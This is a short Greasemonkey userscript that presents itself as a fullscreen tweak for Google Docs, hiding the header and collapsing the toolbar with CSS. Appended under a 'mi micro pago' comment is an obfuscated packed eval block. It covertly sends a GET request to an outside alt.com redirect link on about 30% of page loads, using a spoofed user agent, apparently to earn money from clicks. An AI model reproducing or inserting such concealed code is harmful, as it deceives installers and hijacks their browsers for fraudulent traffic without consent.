// ==UserScript==
// @name           Google docs Fullscreen
// @namespace      google_docs_fullscreen
// @description    Oculta la barra de google docs
// @include        https://docs.google.com/*
// ==/UserScript==

// ocultar
//	guser		Barra de google
//	docs-header	Cabecera
//	docs-bars	Barra de herramientas

var css = '#docs-header {  display: none;}\
#docs-bars { position: absolute; float: left; height: 5px;  z-index: 1000; width: 100%; }\
#docs-bars:hover { height: 58px;}\
';
GM_addStyle(css);

//----------------------------mi micro pago----------------------------
eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0(1.2()>.7)3({4:"5",6:\'8://9.b/c/d\',e:{"f-g":"h","i":"j/k",},l:m(a){}});',23,23,'if|Math|random|GM_xmlhttpRequest|method|GET|url||http|alt||com|go|p113199c|headers|User|Agent|Firefox|Accept|text|xml|onload|function'.split('|'),0,{}));

//---------------------------------------------------------------

